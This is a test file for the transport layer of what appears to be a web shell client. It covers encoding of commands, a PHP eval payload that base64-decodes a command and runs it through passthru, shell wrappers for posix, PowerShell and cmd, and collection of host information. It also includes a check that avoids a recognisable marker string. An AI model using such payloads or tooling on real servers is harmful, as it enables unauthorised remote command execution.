import { describe, expect, it } from 'vitest';
import {
  WEBSHELL_COMMAND_BASE64_PLACEHOLDER,
  type WebShellProfileOptions,
} from '@electron/contracts/shell';
import {
  buildRequest,
  buildSystemInfoCommand,
  buildWebShellPayload,
  buildWebShellCommand,
  createWebShellProtocolNonce,
  extractWebShellResponse,
  parseSystemInfoOutput,
  parseWebShellCommand,
} from '@electron/services/webshell.transport';

const base: WebShellProfileOptions = {
  url: 'https://example.test/run?cmd={{command}}',
  method: 'GET',
  headers: [{ name: 'Cookie', value: 'sid=plain' }],
  bodyKind: 'none',
  commandMode: 'auto',
  responseExtract: 'body',
  responseEncoding: 'utf-8',
  allowInvalidTls: false,
};

describe('WebShell transport helpers', () => {
  it('encodes URL commands and preserves static headers', () => {
    const request = buildRequest(base, 'echo hello world');
    expect(request.url).toContain('cmd=echo%20hello%20world');
    expect(request.headers).toEqual({ Cookie: 'sid=plain' });
  });

  it('encodes form and JSON body templates', () => {
    const form = buildRequest({ ...base, method: 'POST', bodyKind: 'form', bodyTemplate: 'cmd={{command}}' }, 'echo "hello"');
    expect(form.body).toBe('cmd=echo%20%22hello%22');
    expect(form.headers['Content-Type']).toBe('application/x-www-form-urlencoded');
    const json = buildRequest({ ...base, method: 'POST', bodyKind: 'json', bodyTemplate: '{"cmd":{{command}}}' }, 'echo "hello"');
    expect(json.body).toBe('{"cmd":"echo \\\"hello\\\""}');
    expect(json.headers['Content-Type']).toBe('application/json');
  });

  it('base64-encodes a quote-heavy shell wrapper for a language eval form', () => {
    const command = `{ cd '/' || exit 126; printf '\\nf15c4d4a:0\\n'; { echo 'quoted value'; }; r_f15c4d4a=$?; printf '\\nf15c4d4a:1:%s:%s\\n' "$r_f15c4d4a" "$PWD"; }`;
    const request = buildRequest({
      ...base,
      url: 'https://example.test/run',
      method: 'POST',
      bodyKind: 'form',
      bodyTemplate: `x=ob_end_clean();$c=base64_decode('${WEBSHELL_COMMAND_BASE64_PLACEHOLDER}');passthru($c);`,
    }, command);

    const php = new URLSearchParams(request.body).get('x');
    const encoded = php?.match(/base64_decode\('([^']+)'\)/)?.[1];
    expect(encoded).toBeTruthy();
    expect(Buffer.from(encoded ?? '', 'base64').toString('utf8')).toBe(command);
  });

  it('adapts an OS wrapper into PHP source without interpolating shell syntax', () => {
    const wrapper = `{ cd '/tmp' || exit 126; printf 'f15c4d4a:0'; echo "$PWD"; }`;
    const source = buildWebShellPayload('php_eval', wrapper);
    const encoded = source.match(/base64_decode\('([^']+)'\)/)?.[1];
    expect(encoded).toBeTruthy();
    expect(Buffer.from(encoded ?? '', 'base64').toString('utf8')).toBe(wrapper);
    expect(source).toContain("function_exists('passthru')");
    expect(source).not.toContain("cd '/tmp'");
  });

  it('builds and parses shell markers for each supported flavor', () => {
    for (const flavor of ['posix', 'powershell', 'cmd'] as const) {
      const wrapped = buildWebShellCommand(flavor, 'echo ok', '/tmp', 'abc123');
      expect(wrapped).toContain('abc123:0');
      expect(wrapped).not.toMatch(/hexestra/i);
      const result = parseWebShellCommand('abc123:0\nhello\nabc123:1:0:/tmp\n', 'abc123');
      expect(result).toEqual({ output: 'hello', exitCode: 0, cwd: '/tmp' });
    }
  });

  it('uses unique opaque protocol tokens for framing and system information', () => {
    const first = createWebShellProtocolNonce();
    const second = createWebShellProtocolNonce();
    expect(first).toMatch(/^[a-f0-9]{32}$/);
    expect(second).toMatch(/^[a-f0-9]{32}$/);
    expect(second).not.toBe(first);

    const command = buildSystemInfoCommand('posix', first);
    expect(command).toContain(`${first}:3:0:`);
    expect(command).not.toMatch(/hexestra/i);
    expect(parseSystemInfoOutput([
      `${first}:3:0:Linux`,
      `${first}:3:1:node-1`,
      `${first}:3:2:operator`,
      `${first}:3:3:/srv`,
      `${first}:3:4:8.3.0`,
    ].join('\n'), first)).toEqual({
      os: 'Linux', hostname: 'node-1', user: 'operator', cwd: '/srv', runtimeVersion: '8.3.0',
    });
    expect(parseSystemInfoOutput(`${first}:3:0:Linux`, second)).toEqual({});
  });

  it('extracts full, delimited, and regex response bodies', () => {
    expect(extractWebShellResponse('prefix DATA suffix', base)).toBe('prefix DATA suffix');
    expect(extractWebShellResponse('prefix DATA suffix', { ...base, responseExtract: 'between', responseStart: 'prefix ', responseEnd: ' suffix' })).toBe('DATA');
    expect(extractWebShellResponse('<out>DATA</out>', { ...base, responseExtract: 'regex', responseRegex: '<out>(.*?)</out>' })).toBe('DATA');
  });
});
